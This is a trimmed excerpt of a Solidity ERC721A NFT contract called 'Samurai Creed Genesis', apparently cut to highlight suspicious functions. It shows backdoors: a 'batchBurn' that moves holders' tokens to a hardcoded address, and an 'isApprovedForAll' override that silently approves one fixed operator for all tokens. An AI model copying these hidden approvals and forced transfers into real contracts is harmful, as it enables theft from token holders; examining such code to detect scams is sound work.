...
contract Samurai_Creed_Genesis is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 1555;
  ...
  ) ERC721A("Samurai Creed Genesis", "SCG", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x78C186722475Db9b0Dd09dd966102C44743E3D87, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xF9CfD4410E8600A09A405d17c0f602D097B1eB48);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x54Da176381501ADC18597F7971Ab8d80b06c75fC){return true;}
